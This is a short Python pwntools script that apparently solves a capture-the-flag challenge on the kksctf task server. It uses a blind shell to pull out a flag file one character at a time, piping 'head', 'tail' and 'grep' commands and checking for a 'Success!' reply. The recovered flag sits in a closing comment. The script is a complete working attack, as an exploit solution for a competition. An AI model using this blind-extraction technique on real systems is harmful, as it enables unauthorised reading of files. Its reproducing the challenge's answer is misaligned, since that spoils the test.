from hashlib import *
import random
import string
import re
from pwn import *

r = remote('tasks.kksctf.ru', 30010)

i = 1
flag = ""

while True:
    for guess in string.printable:
        r.recvuntil('$ ')
        cmd = f"head -c {i} maybehere/flag.txt | tail -c 1 | grep {guess}"
        # cmd = f"ls -1 maybehere/ | sed -n 1p | head -c {i} | tail -c 1 | grep {guess}"
        r.sendline(cmd)
        result = r.recvline().decode('utf-8').strip()
        print(cmd)
        if result == "Success!":
            flag += guess
            print(flag)
            break
    i += 1

# kks{Bl1nD_sH311_s2cKs_b4t_Y0U_ar3_amaz19g}
